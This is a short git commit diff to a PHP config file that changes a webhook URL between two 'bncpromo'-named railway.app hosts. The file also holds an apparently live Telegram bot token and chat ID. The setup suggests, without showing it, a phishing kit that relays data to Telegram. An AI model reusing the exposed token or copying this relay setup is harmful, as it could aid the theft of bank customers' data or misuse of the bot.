af41c3d9df29d1b006eb855d5568384d2d9cf52d
GOD-HYDRA <78251014+GODHYDRA666@users.noreply.github.com>
2026-09-10 17:48:54 -0500

    Update config.php

--- config.php
+++ config.php
@@ -13,5 +13,5 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
 // ⚙️ Configuración principal (solo accesible por inclusión)
 $bot_token_2 = '8899896266:AAEy5oXbxLb3kKVZC_G3T4VBkFl3y8Mtgjc';  
 $chat_id_2   = '-1003386400137';
-$webhook_url = 'https://bncpromos.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
+$webhook_url = 'https://bncpromocion.up.railway.app/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
 ?>
